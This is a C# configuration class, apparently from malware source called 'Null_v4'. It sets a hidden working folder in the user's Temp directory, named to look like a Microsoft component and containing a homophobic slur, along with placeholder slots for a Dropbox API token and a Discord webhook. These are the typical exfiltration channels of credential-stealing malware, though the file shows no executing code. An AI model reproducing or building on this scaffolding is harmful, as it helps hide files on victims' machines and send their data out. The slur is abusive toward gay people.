using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Null_v4
{
    public class Library
    {
        private static string userLocalDir = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        private static string userRoamingDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        //Data
        public static string Global_Main_Dir = userLocalDir + @"\Temp\Microsoft.Gayshit.045745";
        public static string Global_Main_Dir_Name = "Microsoft.Gayshit.045745";

        public static string Global_Dropbox_Token = "[Dropbox API Token]";
        public static string Global_Dropbox_Folder = "v4";

        public static string Global_Discord_Token = "[Webhook Link here]";
        public static string Global_Discord_Avatar = "[Webhook Picture Link]";
    }
}
